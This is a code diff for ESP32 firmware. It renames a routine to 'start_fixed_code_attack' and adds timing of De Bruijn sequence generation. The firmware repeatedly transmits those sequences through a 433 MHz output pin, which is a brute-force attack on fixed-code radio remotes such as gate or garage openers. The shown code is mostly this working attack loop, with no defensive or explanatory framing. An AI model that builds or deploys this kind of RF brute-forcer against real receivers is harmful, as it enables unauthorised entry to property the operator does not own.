@@ -28,13 +28,25 @@ void tx_seq(char* seq, uint32_t len, double wait)
     }
 }
 
-void try_de_brujin()
+void start_fixed_code_attack()
 {
-    ESP_LOGI(TAG, "Start De brujin");
+    ESP_LOGI(TAG, "Start fixed code attack");
+    
     const char charset[2] = { '0', '1' };
-    char* de_bruijn_seq = de_bruijn(charset, 13, 123);
-    uint32_t len = strlen(de_bruijn_seq);
-    printf("len: %"PRIu32", seq: %s", len, de_bruijn_seq);
+
+    int64_t de_bruijn_seq_start = esp_timer_get_time();
+    char* de_bruijn_seq = de_bruijn(charset, 4, 123);
+    int64_t de_bruijn_seq_end = esp_timer_get_time();
+
+    int64_t de_bruijn_seq_bin_start = esp_timer_get_time();
+    char* de_bruijn_seq_bin = de_bruijn_binary(4);
+    int64_t de_bruijn_seq_bin_end = esp_timer_get_time();
+
+    uint32_t de_bruijn_seq_len = strlen(de_bruijn_seq);
+    uint32_t de_bruijn_seq_bin_len = strlen(de_bruijn_seq_bin);
+
+    printf("len: %"PRIu32", seq: %s TIME: %0.5lf ms\n", de_bruijn_seq_len, de_bruijn_seq, (de_bruijn_seq_end - de_bruijn_seq_start) / 1e3);
+    printf("len: %"PRIu32", seq: %s TIME: %0.5lf ms\n", de_bruijn_seq_bin_len, de_bruijn_seq_bin, (de_bruijn_seq_bin_end - de_bruijn_seq_bin_start) / 1e3);
 
     while (1)
     {
@@ -45,19 +57,20 @@ void try_de_brujin()
             const double wait = (1 / baudrate) * 1e3;
             for(int i = 0; i < TX_REPEAT; ++i)
             {
-                tx_seq(de_bruijn_seq, len, wait);
+                tx_seq(de_bruijn_seq, de_bruijn_seq_len, wait);
             }
             vTaskDelay(5 / portTICK_PERIOD_MS);
         }
 
         const int64_t end_time = esp_timer_get_time();
 
-        printf("Try de_brujin: %"PRId64" us | %0.5lf ms", end_time - start_time, (end_time - start_time) / 1e3);
+        printf("Try de_brujin: %"PRId64" us | %0.5lf ms \n", end_time - start_time, (end_time - start_time) / 1e3);
 
         vTaskDelay(1000 / portTICK_PERIOD_MS);
     }
 
     free(de_bruijn_seq);
+    free(de_bruijn_seq_bin);
 
     vTaskSuspend(NULL);
 
@@ -73,6 +86,6 @@ void app_main(void)
     gpio_set_direction(TX_433, GPIO_MODE_OUTPUT);
 
 
-    xTaskCreate(try_de_brujin, "DeBrujin", 8192, NULL, 1, NULL);
+    xTaskCreate(start_fixed_code_attack, "Start fixed code attack", 8192, NULL, 1, NULL);
 
 }
